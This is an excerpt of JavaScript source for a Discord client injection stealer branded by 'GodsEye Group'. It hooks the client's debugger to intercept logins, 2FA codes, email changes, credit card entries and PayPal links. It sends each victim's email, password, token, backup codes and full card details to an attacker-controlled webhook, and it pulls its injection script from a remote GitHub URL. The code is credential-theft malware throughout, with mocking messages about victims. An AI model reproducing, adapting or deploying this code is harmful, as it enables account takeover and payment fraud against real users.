...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/GodsEyeGroup/ged-injection/refs/heads/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "ged injection - GE injection";
    content["avatar_url"] = "https://i.ibb.co/vDzC0wD/ge-stealer-remastered-cirlce-logo.png";
    ...
    content["embeds"][0]["footer"] = {
        "text": "ged injection - made by GodsEye Group",
        "icon_url": "https://i.ibb.co/Wc41cyw/ge-stealer-logo-1.png",
    };
    content["embeds"][0]["title"] = "ǟƈƈօʊռȶ ֆɦɨȶ";
    ...
    content["embeds"].push({
        "title": `ȶօȶǟʟ ʄʀɨɛռɖʟʏ'ֆ: ${friends.totalFriends}`,
        "description": friends.message,
    }, {
        "title": `ȶօȶǟʟ ֆӼʀʋɛʀֆ: ${servers.totalGuilds}`,
...
const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`ռɨȶʀօʊֆ ƈʟǟֆֆʏ`';
        case 2:
            return '`ռɨȶʀօʊֆ ɮօօֆȶɛʀ`';
        case 3:
            return '`ռɨȶʀօʊֆ օʟɖ`';
        default:
            return '`❌`';
...
const getFriends = async token => {
    ...
    for (const acc of filteredFriends) {
        ...
        if (badges != "") {
            if (!rareUsers) rareUsers = "**ʀǟʀɛ ʄʀɨɛռɖʟʏ'ֆ:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**ռօ ʀǟʀɛ ʄʀɨɛռɖʟʏ'ֆ**";
...
const getServers = async token => {
    ...
    rareGuilds = rareGuilds || "**ռօ ʀǟʀɛ ֆӼʀʋɛʀֆ**";
...
const BackupCodesViewed = async (codes, token) => {
    ...
    const content = {
        "content": `**${account.username}** we IN <:ge:1331182485991850055> got the codes.`,
        "embeds": [{
            "fields": [{
                    "name": "2 ef aye Codes",
                    "value": "```" + message + "```",
...
const CreditCardAdded = async (number, cvc, month, year, token) => {
    ...
    const content = {
        "content": `**${account.username}** just added a fucking come up.`,
        "embeds": [{
            "fields": [{
                "name": "Num",
                "value": "`" + number + "`",
                ...
                "name": "Date It expires <:ugh:1330794292519637074>",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
...
const PaypalAdded = async (token) => {
    ...
    const content = {
        "content": `**${account.username}** cash money found <:paypal:1148653305376034967>.`,
        "embeds": [{
            "fields": [{
                "name": "E-Male",
                "value": "`" + account.email + "`",
...
async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        ...
        const content = {
            "content": `**${account.username}** just got fucked!`,
    ...
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        ...
        switch (true) {
            ...
            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2 ef aye");
                break;
            ...
            case params.response.url.endsWith('/@me'):
                ...
                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed E-Male profile to **" + requestData.email + "**");
                }
